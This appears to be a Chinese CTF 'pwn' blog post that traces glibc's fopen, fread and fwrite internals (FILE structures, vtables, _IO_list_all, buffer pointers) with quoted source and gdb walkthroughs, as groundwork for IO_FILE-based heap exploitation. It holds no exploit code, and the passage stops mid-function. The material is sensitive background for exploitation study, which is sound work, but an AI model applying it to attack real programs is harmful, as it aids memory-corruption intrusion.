---
title: 【PWN】iofile
---

要学习基于IO_FILE的堆利用就得了解它的本质，以下会介绍几个主要的IO函数，结合源码和动态调试去学习。

## IO_FILE之fopen

首先是编写一个简单的调用fopen函数的C程序。

 ```c
 #include<stdio.h>
 
 int main(){
 
     FILE*fp = fopen("test","wb");
     char *ptr = malloc(0x20);
     return 0;
 }
 ```

   在正式调试之前，先看一下fopen的总体流程图，有个总体的概念。有了主线之后，跟进代码后才不会在里面走丢了。如下图所示，先不解释太多，先跟着动手调试分析完fopen函数的执行流程，再反过头看看这个流程图就会很清晰了。

 ![image-20211226163653366](/images/heap/image-20211226163653366.png)

​    那么接下来就直接编译上面的源码，然后使用gdb调试程序，gdb跟进fopen函数，可以看到fopen实际上是_IO_new_fopen，它调用的是__fopen_internal。

 ![image-20211226163700390](/images/heap/image-20211226163700390.png)

​    跟进__fopen_internal中。关键代码如下。

 ```c
 _IO_FILE *
 __fopen_internal (const char *filename, const char *mode, int is32)
 {
   struct locked_FILE
   {
     struct _IO_FILE_plus fp;
 #ifdef _IO_MTSAFE_IO
     _IO_lock_t lock;
 #endif
      struct _IO_wide_data wd;
    } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  // 1、 分配内存
  
  ...
  
    _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps); // 2、 初始化结构体
  ...
  
    _IO_JUMPS (&new_f->fp) = &_IO_file_jumps;// 设置vtable为_IO_file_jumps
    _IO_file_init (&new_f->fp);// 3、 将file结构体链接至_IO_list_all
  
  ...
    // 4、 打开文件
    if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)
      return __fopen_maybe_mmap (&new_f->fp.file);
  
  }
 ```

​     整个__fopen_internal函数包含四个部分：

1. malloc分配内存空间

2. _IO_no_init对File结构体进行初始化

3. _IO_file_init将结构体链接至_IO_list_all链表中

4. _IO_file_fopen执行系统调用打开文件

​    可以看到malloc函数分配了一个struct locked_FILE大小的结构体，并将返回的地址赋给了new_f变量。这个结构体在函数刚开始的地方被定义，在64位系统中大小为0x230，共包含了以下三个结构：_IO_FILE_plus、_IO_lock_t、IO_wide_data，其中_IO_FILE_plus为使用的IO_FILE结构体。

​    在gdb中可用p命令查看相关信息。

 ![image-20211226163837409](/images/heap/image-20211226163837409.png)

   调用完malloc之后，接着调用了_IO_no_init函数去初始化结构体，跟进去该函数。函数在/libio/genops.c中。

 ```c
 void
 _IO_old_init (_IO_FILE *fp, int flags)
 {
   fp->_flags = _IO_MAGIC|flags;
   fp->_flags2 = 0;
   fp->_IO_buf_base = NULL;
   fp->_IO_buf_end = NULL;
   fp->_IO_read_base = NULL;
   fp->_IO_read_ptr = NULL;
   fp->_IO_read_end = NULL;
   fp->_IO_write_base = NULL;
   fp->_IO_write_ptr = NULL;
   fp->_IO_write_end = NULL;
   fp->_chain = NULL; /* Not necessary. */
 
   fp->_IO_save_base = NULL;
   fp->_IO_backup_base = NULL;
   fp->_IO_save_end = NULL;
   fp->_markers = NULL;
   fp->_cur_column = 0;
 #if _IO_JUMPS_OFFSET
   fp->_vtable_offset = 0;
 #endif
 #ifdef _IO_MTSAFE_IO
   if (fp->_lock != NULL)
     _IO_lock_init (*fp->_lock);
 #endif
 }
 
 void
 _IO_no_init (_IO_FILE *fp, int flags, int orientation,
       struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)
 {
   _IO_old_init (fp, flags);
   fp->_mode = orientation;
 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   if (orientation >= 0)
     {# 初始化fp的_wide_data字段
       fp->_wide_data = wd;
       fp->_wide_data->_IO_buf_base = NULL;
       fp->_wide_data->_IO_buf_end = NULL;
       fp->_wide_data->_IO_read_base = NULL;
       fp->_wide_data->_IO_read_ptr = NULL;
       fp->_wide_data->_IO_read_end = NULL;
       fp->_wide_data->_IO_write_base = NULL;
       fp->_wide_data->_IO_write_ptr = NULL;
       fp->_wide_data->_IO_write_end = NULL;
       fp->_wide_data->_IO_save_base = NULL;
       fp->_wide_data->_IO_backup_base = NULL;
       fp->_wide_data->_IO_save_end = NULL;
 
       fp->_wide_data->_wide_vtable = jmp;
     }
   else
     /* Cause predictable crash when a wide function is called on a byte
        stream.  */
     fp->_wide_data = (struct _IO_wide_data *) -1L;
 #endif
   fp->_freeres_list = NULL;
 }
 ```

​    可以看到函数最主要的功能是初始化locked_FILE里面的_IO_FILE_plus结构体，基本上将所有的值都初始化为NULL以及默认值，同时将_wide_data字段赋值并初始化。初始化结束后，FILE结构体如下。

 ![image-20211226163910860](/images/heap/image-20211226163910860.png)

   执行完_IO_no_init后，函数使用lea指令将_IO_FILE_plus结构体的vtable设置成了_IO_file_jumps(0x7ffff7dd06e0)。

 ![image-20211226163917758](/images/heap/image-20211226163917758.png)

   然后调用_IO_file_init将_IO_FILE_plus结构体链接到了_IO_list_all链表中，跟进该函数。

 ![image-20211226163921748](/images/heap/image-20211226163921748.png)

  该函数在/libio/fileops.c中。

 ```c
 void
 _IO_new_file_init (struct _IO_FILE_plus *fp)
 {
   /* POSIX.1 allows another file handle to be used to change the position
      of our file descriptor.  Hence we actually don't know the actual
      position before we do the first fseek (and until a following fflush). */
   fp->file._offset = _IO_pos_BAD;
   fp->file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;
 
  # 调用_IO_link_in和设置_fileno
   _IO_link_in (fp);
   fp->file._fileno = -1;
 }
 ```

   可以看到这个函数的主体是调用了_IO_link_in函数，跟进去，函数在/libio/genops.c中。

 ```c
 void
 _IO_link_in (struct _IO_FILE_plus *fp)
 {
 # 检查flag的标志位是否是_IO_LINKED
   if ((fp->file._flags & _IO_LINKED) == 0)
     {
 # 设置_IO_LINKED标志位
       fp->file._flags |= _IO_LINKED;
 #ifdef _IO_MTSAFE_IO
       _IO_cleanup_region_start_noarg (flush_cleanup);
       _IO_lock_lock (list_all_lock);
       run_fp = (_IO_FILE *) fp;
       _IO_flockfile ((_IO_FILE *) fp);
 #endif
       fp->file._chain = (_IO_FILE *) _IO_list_all;
       _IO_list_all = fp;
       ++_IO_list_all_stamp;
 #ifdef _IO_MTSAFE_IO
       _IO_funlockfile ((_IO_FILE *) fp);
       run_fp = NULL;
       _IO_lock_unlock (list_all_lock);
       _IO_cleanup_region_end (0);
 #endif
     }
 }
 ```

​    FILE结构体是通过_IO_list_all的单链表进行管理的，这里_IO_link_in函数的功能是检查FILE结构体是否包含_IO_LINKED标志，如果不包含则表示这个结构体没有链接进入_IO_list_all，则在后面将其链接进_IO_list_all链表，同时设置FILE结构体的_chain字段为之前的链表的值，否则直接返回。

​    所有_IO_file_init主要功能是将FILE结构体链接进入_IO_list_all链表。在没执行_IO_file_init函数前，_IO_list_all指向的是stderr结构体。

 ![image-20211226164005395](/images/heap/image-20211226164005395.png)

​    执行完后可以看到_IO_list_all指向的是申请出来的结构体。

![image-20211226164030798](/images/heap/image-20211226164030798.png)

​    此时FILE结构体的_chain字段指向了之前的stderr结构体。

 ![image-20211226164021315](/images/heap/image-20211226164021315.png)

将FILE结构体链接到_IO_list_all链表后，程序返回到__fopen_internal中，最后是调用_IO_file_open函数打开文件句柄，跟进该函数。函数在/libio/fileops.c中。

 ```c
 _IO_FILE *
 _IO_new_file_fopen (_IO_FILE *fp, const char *filename, const char *mode,
             int is32not64)
 {
   
   ...
   # 检查文件是否以打开，打开则返回
   if (_IO_file_is_open (fp))
     return 0;
   ## 设置文件打开模式
   switch (*mode)
     {
     case 'r':
       omode = O_RDONLY;
       read_write = _IO_NO_WRITES;
       break;
       ...    
      }
   ...
   # 调用_IO_file_open函数
   result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,
               is32not64);
   ...
 }
 ```

  函数会先检查文件描述符是否打开，然后设置文件打开的模式，最后调用_IO_file_open函数。跟进_IO_file_open函数，该函数在/libio/fileops.c中。

 ```c
 _IO_FILE *
 _IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot,
            int read_write, int is32not64)
 {
   int fdesc;
 
   ...
   # 调用系统函数open打开文件  
   fdesc = open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);
   ...
   # 将文件描述符设置到FILE结构体的相应字段_fileno里
   fp->_fileno = fdesc;
   ...
   #再次调用_IO_link_in
   _IO_link_in ((struct _IO_FILE_plus *) fp);
   return fp;
 }
 ```

​    函数的主要功能就是执行系统调用open打开文件，并将文件描述符赋值给FILE结构体的_fileno字段，最后再次调用_IO_link_in函数，确保该结构体被链接到_IO_list_all链表。

​    执行完_IO_new_file_fopen函数后，FILE结构体如下图所示。

 ![image-20211226164125792](/images/heap/image-20211226164125792.png)

​    该函数执行完后，程序返回FILE结构体指针，分析结束。

   整个流程还是比较清晰的，fopen返回之后，_IO_list_all链表指向返回的FILE结构体，且FILE结构体的_chain字段指向之前的结构体（没有其他额外打开文件的话，将指向stderr结构体），同时其他的字段大多是默认的NULL值，vtable存储的是_IO_file_jumps。

## IO_FILE之fread

   前面分析了系统如何为FILE结构体分配内存并将其链接进_IO_list_all，那么这里则是讲述创建文件FILE之后，fread如何实现从文件中读取数据的。fread的大致流程如下。

 ![image-20211226164140497](/images/heap/image-20211226164140497.png)

   整体流程为fread调用vtable中的IO_file_xsgetn，其中IO_file_xsgetn是fread的核心函数，它的流程大致如下：

1. 判断fp->_IO_buf_base输入缓冲区是否为空，如果为空则调用_IO_doalllocbuf去初始化输入缓冲区。

2. 在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。

3. 如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用_underflow函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。

fread的函数原型是：

   size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );

   其中，ptr：指向保存结果的指针；size：每个数据类型的大小；count：数据的个数；stream：文件指针函数返回读取数据的个数。

   示例程序如下。

 ```c
 #include<stdio.h>
 
 int main(){
 
     FILE* fp = fopen("test","rb");
     char *ptr = malloc(0x20);
     fread(ptr, 1, 20, fp);
     return 0;
 }
 ```

   编译完成后用gdb进行调试。

   断点下载fread，在开始之前先查看下FILE结构体fp的内容。从下面的图里可以看到此时_IO_read_ptr和_IO_buf_base等指针都是空的，后面的分析一个很重要的步骤就是看这些指针是如何被赋值以及发挥作用的。

 ![image-20211226164218192](/images/heap/image-20211226164218192.png)

   vtable中的指针内容如下。

 ![image-20211226164224662](/images/heap/image-20211226164224662.png)

   fread实际上是_IO_fread函数，文件目录为/libio/iofread.c。

 ```c
 _IO_size_t
 _IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
 {
   _IO_size_t bytes_requested = size * count;
   _IO_size_t bytes_read;
   CHECK_FILE (fp, 0);
   if (bytes_requested == 0)
     return 0;
   _IO_acquire_lock (fp);
 
 # 调用_IO_sgetn函数
   bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
   _IO_release_lock (fp);
   return bytes_requested == bytes_read ? count : bytes_read / size;
 }
 libc_hidden_def (_IO_fread)
 }
 ```

_IO_fread函数调用了_IO_sgetn函数，跟进该函数。

```c
_IO_size_t
_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
libc_hidden_def (_IO_sgetn)
```

又看到其调用了_IO_XSGETN函数，查看其定义。

```c
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```

​    实际上就是FILE结构体中vtable的__xsgetn函数，跟进去/libio/fileops.c。

​    _IO_file_xsgetn是处理fread读入数据的核心函数，分为以下几个部分：

1. fp->_IO_buf_base为空时，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用_IO_doallocbuf去初始化指针，建立输入缓冲区。

2. 输入缓冲区有输入，即fp->_IO_read_ptr小于fp->_IO_read_end，此时将缓冲区里的数据直接拷贝到目标buff。

3. 输入缓冲区里的数据为空或者是不能满足全部的需求，则调用__underflow调用系统调用读入数据。

 ```c
 _IO_size_t
 _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
 {
   _IO_size_t want, have;
   _IO_ssize_t count;
   char *s = data;
 
   want = n;
 
   if (fp->_IO_buf_base == NULL)
     {
       ...
       # 1、如果fp->_IO_buf_base为空的话则调用_IO_doallocbuf
       _IO_doallocbuf (fp);
     }
 
   while (want > 0)
     {
 
       have = fp->_IO_read_end - fp->_IO_read_ptr;
       if (want <= have)   # 2、输入缓冲区里已经有足够的字符，则直接把缓冲区里的字符给目标buff
     {
       memcpy (s, fp->_IO_read_ptr, want);
       fp->_IO_read_ptr += want;
       want = 0;
     }
       else
     {
       if (have > 0)  # 3、输入缓冲区里有部分字符，但是没有达到fread的size需求，先把已有的拷贝至目标buff
         {
           ...
           memcpy (s, fp->_IO_read_ptr, have);
           s += have;
 
           want -= have;
           fp->_IO_read_ptr += have;
         }
 
 
       if (fp->_IO_buf_base
           && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
         {
           if (__underflow (fp) == EOF)  # 4、输入缓冲区里不能满足需求，调用__underflow读入数据
          break;
 
           continue;
         }
       ...
   return n - want;
 }
 libc_hidden_def (_IO_file_xsgetn)
 ```

​    接下来对_IO_file_xsgetn这三部分进行跟进并分析。

​    首先在fp->_IO_buf_base为空时，也就是输入缓冲区未建立时，代码调用_IO_doallocbuf去建立输入缓冲区。跟进_IO_doallocbuf函数，看下它是如何初始化缓冲区的，为输入缓冲区分配空间的，文件在/libio/genops.c中。

 ```c
 void
 _IO_doallocbuf (_IO_FILE *fp)
 {
   if (fp->_IO_buf_base) # 如果输入缓冲区不为空，直接返回
     return;
   if (!(fp->_flags & _IO_UNBUFFERED) || fp->_mode > 0) # 检查标志位
     if (_IO_DOALLOCATE (fp) != EOF) # 调用vtable函数
       return;
   _IO_setb (fp, fp->_shortbuf, fp->_shortbuf+1, 0);
 }
 libc_hidden_def (_IO_doallocbuf)
 ```

​    函数首先检查fp->_IO_buf_base是否为空，如果不为空表明该输入缓冲区已被初始化，那么直接返回。如果为空，则检查fp->_flags看它是不是_IO_UNBUFFERED或者fp->_mode大于0，如果满足条件则调用FILE的vtable中的_IO_file_doallocate，跟进该函数，在/libio/filedoalloc.c中。

 ```c
 _IO_file_doallocate (_IO_FILE *fp)
 {
   _IO_size_t size;
   char *p;
   struct stat64 st;
 
   ...
   size = _IO_BUFSIZ;
   ...
   if (fp->_fileno >= 0 && __builtin_expect (_IO_SYSSTAT (fp, &st), 0) >= 0) # 调用_IO_SYSSTAT获取FILE信息
    {
      ... 
      if (st.st_blksize > 0)
          size = st.st_blksize;
      ...
    }
  p = malloc (size);
  ...
  _IO_setb (fp, p, p + size, 1); # 调用_IO_setb设置FILE缓冲区
   return 1;
 }
 libc_hidden_def (_IO_file_doallocate)
 ```

​    可以看到_IO_file_doallocate函数是分配输入缓冲区的实现函数，首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的__stat函数。获取文件信息，修改相应需要申请的size。可以看到在执行完_IO_SYSSTAT函数后，st结构体的值为下图所示。

 ![image-20211226164452851](/images/heap/image-20211226164452851.png)

​    因此size被修改为st.st_blksize所对应大小的4096即0x1000，接着调用malloc去申请内存，申请出来的堆块如下图所示。

 ![image-20211226164457878](/images/heap/image-20211226164457878.png)

​    空间申请出来后，调用_IO_setb，跟进去看它干了些啥，文件在/libio/genops.c中。

 ```c
 void
 _IO_setb (_IO_FILE *f, char *b, char *eb, int a)
 {
   ...
   f->_IO_buf_base = b; # 设置_IO_buf_base 
   f->_IO_buf_end = eb; # 设置_IO_buf_end
   ...
 }
 libc_hidden_def (_IO_setb)
 ```

​    函数逻辑比较简单，就是设置了_IO_buf_base和_IO_buf_end，那么在IO_setb执行完之后，fp的这两个指针被赋上了值。

 ![image-20211226164516644](/images/heap/image-20211226164516644.png)

​    到此，初始化缓冲区就完成了，函数返回_IO_file_doallocate后，接着_IO_file_doallocate也返回，回到_IO_file_xsgetn函数中。

​    接下来程序也就进入到了第二部分，拷贝输入缓冲区数据，如果输入缓冲区存在已输入的数据，则把它直接拷贝到目标缓冲区里。

​    需要说明下的是从这里可以看出来fp->_IO_read_ptr指向的是输入缓冲区的起始地址，fp->_IO_read_end指向的是输入缓冲区的结束地址。

​    将fp->_IO_read_ptr到fp->_IO_read_end之间的数据通过memcpy拷贝到目标缓冲区中。

​    在输入缓冲区为0或者是不能满足需求的时候则会执行到最后一步__underflow去执行系统调用read读取数据，并放入到输入缓冲区里。因为我们的这个示例程序是第一次读取数据，此时的fp->_IO_read_end和fp->_IO_read_ptr都是0，因此会进入到__underflow，跟进去细看，文件在/libio/genops.c中。

 ```c
 int
 __underflow (_IO_FILE *fp)
 {
 
   # 额外的检查
   ...
   if (fp->_IO_read_ptr < fp->_IO_read_end)
     return *(unsigned char *) fp->_IO_read_ptr;
   ...
   # 调用_IO_UNDERFLOW
   return _IO_UNDERFLOW (fp);
 }
 libc_hidden_def (__underflow)
 ```

​    函数稍微做一些检查就会调用_IO_UNDERFLOW函数，其中一个检查是如果fp->_IO_read_ptr小于fp->_IO_read_end则表明输入缓冲区里存在数据，可直接返回，否则表示需要继续读入数据。该函数是FILE结构体vtable里的_IO_new_file_underflow，跟进去看文件在/libio/fileops.c。

 ```c
 int
 _IO_new_file_underflow (_IO_FILE *fp)
 {
   _IO_ssize_t count;
   ...
   # 如果存在_IO_NO_READS标志，则直接返回
   if (fp->_flags & _IO_NO_READS)
     {
       fp->_flags |= _IO_ERR_SEEN;
       __set_errno (EBADF);
       return EOF;
     }
   # 如果输入缓冲区里存在数据，则直接返回
   if (fp->_IO_read_ptr < fp->_IO_read_end)
     return *(unsigned char *) fp->_IO_read_ptr;
   ...
   ## 如果没有输入缓冲区，则调用_IO_doallocbuf分配输入缓冲区
   if (fp->_IO_buf_base == NULL)
     {
       ...
       _IO_doallocbuf (fp);
     }
   ...
   # 设置FILE结构体指针
   fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
   fp->_IO_read_end = fp->_IO_buf_base;
   fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
     = fp->_IO_buf_base;
   # 调用_IO_SYSREAD函数最终执行系统调用读取数据
   count = _IO_SYSREAD (fp, fp->_IO_buf_base,
                fp->_IO_buf_end - fp->_IO_buf_base);
   ...
   # 设置结构体指针
   fp->_IO_read_end += count;
   ...
   return *(unsigned char *) fp->_IO_read_ptr;
 }
 libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
 ```

​    这个`_IO_new_file_underflow`函数，是最终调用系统调用的地方，在最终执行系统调用之前，仍然有一些检查，整个流程为：

1. 检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 /* Reading not allowed */。

2. 如果fp->_IO_buf_base为NULL，则调用_IO_doallocbuf分配输入缓冲区。

3. 接着初始化设置FILE结构体指针，将他们都设置成fp->_IO_buf_base

4. 调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，数据读入到fp->_IO_buf_base中，读入大小为输入缓冲区的大小fp->_IO_buf_end - fp->_IO_buf_base。

5. 设置输入缓冲区已有数据的size，即设置fp->_IO_read_end为fp->_IO_read_end += count。

​    其中第二步里面的如果`fp->_IO_buf_base`为NULL，则调用`_IO_doallocbuf`分配输入缓冲区。

​    其中第四步的`_IO_SYSREAD`（vtable中的`_IO_file_read`函数）的源码比较简单，就是执行系统调用函数read去读取文件数据，文件在`libio/fileops.c`，源码如下：

 ```c
 _IO_ssize_t
 _IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)
 {
    return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0)
            ? read_not_cancel (fp->_fileno, buf, size)
            : read (fp->_fileno, buf, size));
  }
 ```

​    _IO_file_underflow函数执行完毕以后，FILE结构体中各个指针已被赋值，且文件数据已读入，输入缓冲区里已经有数据，结构体值如下，其中fp->_IO_read_ptr指向输入缓冲区数据的开始位置，fp->_IO_read_end指向输入缓冲区数据结束的位置：

​     ![image-20211226164632633](/images/heap/image-20211226164632633.png)

   函数执行完，返回到_IO_file_xsgetn函数中，由于while循环的存在，重新执行第二部分，此时将输入缓冲区拷贝到目标缓冲区，最终返回。

​    至此，对于fread的源码分析结束。、

## IO_FILE之fwrite

​    在开始上源码之前，还是将fwrite的总体流程先描述一遍，好让大家有个大概的概念。

​    fwrite函数的总体流程图如下。

 ![image-20211226164648994](/images/heap/image-20211226164648994.png)

   fwrite的主要实现在_IO_new_file_xsputn中，整体流程包含四个部分。

1. 首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝到输出缓冲区。

2. 如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用_IO_OVERFLOW建立输出缓冲区或刷新输出缓冲区。

3. 输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用sys_write输出目标数据。

4. 如果按块输出数据后还剩一点数据则调用_IO_default_xsputn将数据拷贝到输出缓冲区。

​    接着介绍一下其中涉及的几个IO_FILE结构体的指针。

| 指针           | 描述                   |
| -------------- | ---------------------- |
| _IO_buf_base   | 输入输出缓冲区基地址   |
| _IO_buf_end    | 输入输出缓冲区结束地址 |
| _IO_write_base | 输出缓冲区基地址       |
| _IO_write_ptr  | 输入缓冲区当前地址     |
| _IO_write_end  | 输出缓冲区结束地址     |

​    其中_IO_buf_base和_IO_buf_end是缓冲区建立函数_IO_doallocbuf（上小结详细描述过）会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base中，结束地址保存在_IO_buf_end中。在建立输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr表示为已经使用的地址。即_IO_write_base到_IO_write_ptr之间的空间是已经使用的缓冲区，_IO_write_ptr到_IO_write_end之间为剩余的输出缓冲区。

​    fwrite函数的原型

 ```c
 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 # ptr-- 这是指向要被写入的元素数组的指针。
 # size-- 这是要被写入的每个元素的大小，以字节为单位。
 # nmemb-- 这是元素的个数，每个元素的大小为 size 字节。
 # stream-- 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输出流。
 ```

首先仍然是一个示例程序。

 ```c
 #include<stdio.h>
 
 int main(){
 
     FILE* fp = fopen("test","wb");
     char *ptr = malloc(0x20);
     fwrite(ptr, 1, 0x20, fp);
     return 0;
 } 
 ```

​    编译完成之后，使用gdb进行调试，在fwrite处下断点。看到程序首先断在_IO_fwrite处。

 ![image-20211226164754206](/images/heap/image-20211226164754206.png)

​    在开始调试之前，还是先把传入的IO_FILE的fp值看一下，如下图所示。

 ![image-20211226164802873](/images/heap/image-20211226164802873.png)

​    此时vtable中的内容如下图。

 ![image-20211226164811648](/images/heap/image-20211226164811648.png)

​    从图中可以看出刚经过fopen初始化，输入输出缓冲区没有建立，此时所有指针都为空。_IO_fwrite函数在文件/libio/iofwrite.c中。

 ```c
 _IO_size_t
 _IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
 {
   _IO_size_t request = size * count;
   ...
   if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
     written = _IO_sputn (fp, (const char *) buf, request);
   ...
 }
 libc_hidden_def (_IO_fwrite)
 ```

​    没有做过多操作就调用了_IOsputn函数，该函数是vtable中的__xsputn(_IO_new_file_xsputn)在文件/libio/fileops.c中。源码分析从四个部分进行，其中下面每部分代码都是_IO_new_file_xsputn函数中的源码。

​    第一部分所包含的代码如下。

 ```c
 _IO_size_t
 _IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
 { 
 
     _IO_size_t count = 0;
 ...
     # 判断输出缓冲区还有多少空间
     else if (f->_IO_write_end > f->_IO_write_ptr)
     count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
 
   # 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区
   if (count > 0)
     {
       if (count > to_do)
   count = to_do;
   ...
       memcpy (f->_IO_write_ptr, s, count);
       f->_IO_write_ptr += count;
     # 计算是否还有目标输出数据剩余
       s += count;
       to_do -= count;
 ```

​    主要功能就是判断输出缓冲区还有多少空间，其中像示例程序所示的f->_IO_write_end以及f->_IO_write_ptr均为0，此时的输出缓冲区为0。

​    另一部分则是如果输出缓冲区仍有剩余空间的话，则将目标输出数据拷贝至输出缓冲区，并计算在输出缓冲区填满后，是否仍然剩余目标输出数据。

​    第二部分代码如下。

 ```c
   # 如果还有目标数据剩余，此时则表明输出缓冲区未建立或输出缓冲区已经满了
   if (to_do + must_flush > 0)
     {
       _IO_size_t block_size, do_write;
       # 函数实现清空输出缓冲区或建立缓冲区的功能
       if (_IO_OVERFLOW (f, EOF) == EOF)
   
   return to_do == 0 ? EOF : n - to_do;
 
       # 检查输出数据是否是大块
       block_size = f->_IO_buf_end - f->_IO_buf_base;
       do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
 ```

​    经过了上一步骤，如果还有目标输出数据，表明输出缓冲区未建立或输出缓冲区已经满了，此时调用_IO_OVERFLOW函数。该函数功能主要是实现刷新输出缓冲区或建立缓冲区，它就是vtable中的__overlfow（_IO_new_file_overflow），文件在/libio/fileops.c中。

 ![image-20211226164906085](/images/heap/image-20211226164906085.png)

 ```c
 int
 _IO_new_file_overflow (_IO_FILE *f, int ch)
 {
   # 判断标志位是否包含_IO_NO_WRITES
   if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
     {
       f->_flags |= _IO_ERR_SEEN;
       __set_errno (EBADF);
       return EOF;
     }
   
   # 判断输出缓冲区是否为空
   if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
     {
       /* Allocate a buffer if needed. */
       if (f->_IO_write_base == NULL)
   {
     # 分配输出缓冲区
     _IO_doallocbuf (f);
     _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
   }
      
      # 初始化指针
       if (f->_IO_read_ptr == f->_IO_buf_end)
   f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
       f->_IO_write_ptr = f->_IO_read_ptr;
       f->_IO_write_base = f->_IO_write_ptr;
       f->_IO_write_end = f->_IO_buf_end;
       f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
 
       f->_flags |= _IO_CURRENTLY_PUTTING;
       if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
   f->_IO_write_end = f->_IO_write_ptr;
     }
    
   # 输出输出缓冲区 
   if (ch == EOF)
     return _IO_do_write (f, f->_IO_write_base,
        f->_IO_write_ptr - f->_IO_write_base);
   if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
     if (_IO_do_flush (f) == EOF) ## 
       return EOF;
   *f->_IO_write_ptr++ = ch;
   if ((f->_flags & _IO_UNBUFFERED)
       || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
     if (_IO_do_write (f, f->_IO_write_base,
           f->_IO_write_ptr - f->_IO_write_base) == EOF)
       return EOF;
   return (unsigned char) ch;
 }
 libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
 ```

​    __overflow函数首先检测_IO_FILE的flags是否包含_IO_NO_WRITES标志位，如果包含的话直接返回。

​    接着判断f->_IO_write_base是否为空，如果为空表明输出缓冲区尚未建立，就调用_IO_doallocbuf函数去分配输出缓冲区，_IO_doallocbuf函数源码在上小节fread中已经分析过了，就不继续跟进分析了，总结下它功能就是分配输出输出缓冲区并将指针_IO_buf_base和_IO_buf_end赋值。

​    在执行_IO_doallocbuf分配完空间后调用_IO_setg宏，该宏的定义如下，它将输出相关的缓冲区指针赋值为_IO_buf_base指针。

 ```c
 #define _IO_setg(fp, eb, g, eg)  ((fp)->_IO_read_base = (eb),
 (fp)->_IO_read_ptr = (g), (fp)->_IO_read_end = (eg))
 ```

​    经过上面这些步骤，此时IO_FILE的指针如下图所示。可以看到_IO_buf_base和_IO_buf_end被赋值了，且输出相关缓冲区指针被赋值为_IO_buf_base。

 ![image-20211226164959672](/images/heap/image-20211226164959672.png)

​    然后代码初始化其他相关指针，最主要的就是将f->_IO_write_base以及f->_IO_write_ptr设置成f->_IO_read_ptr指针；将f->_IO_write_end赋值为f->_IO_buf_end指针。

​    接着就执行_IO_do_write来调用系统调用write输出输出缓冲区，输出的内容为f->_IO_write_ptr到f->_IO_write_base之间的内容。跟进去该函数，函数在/libio/fileops.c中。

 ```c
 int
 _IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
 {
   return (to_do == 0
     || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
 }
 libc_hidden_ver (_IO_new_do_write, _IO_do_write)
 ```

​    该函数调用了new_do_write，跟进去，函数在/libio/fileops.c中。

 ```c
 static
 _IO_size_t
 new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
 {
   _IO_size_t count;
   ...
   # 额外判断
   else if (fp->_IO_read_end != fp->_IO_write_base)
     {
       _IO_off64_t new_pos
   = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
       if (new_pos == _IO_pos_BAD)
   return 0;
       fp->_offset = new_pos;
     }
   # 调用函数输出输出缓冲区
   count = _IO_SYSWRITE (fp, data, to_do);
   ...
   # 刷新设置缓冲区指针
   _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
   fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
